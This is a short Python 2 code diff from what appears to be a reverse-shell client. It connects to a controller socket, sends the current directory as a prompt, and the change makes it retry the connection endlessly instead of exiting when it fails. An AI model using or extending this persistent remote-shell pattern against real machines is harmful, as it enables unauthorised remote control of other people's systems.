@@ -6,6 +6,7 @@ import os
 import threading
 import time
 import shell_commands
+from shell_config import * 
 
 marker = chr(255)
 
@@ -15,10 +16,16 @@ def connect():
     comm_socket.connect(("127.0.0.1", 80))
     comm_socket.sendall("\n"+os.getcwd()+">"+marker)
 
-try:
-    connect()
-except socket.error:
-    sys.exit("Can't connect to host!")
+while True:
+    try:
+        connect()
+        print "worked"
+        break
+    except:
+        print "Can't connect! Trying again in " + str(sleeptime) + " seconds..."
+        time.sleep(sleeptime)
+
+
 output_queue = Queue.Queue()
 
 class MessageHandler:
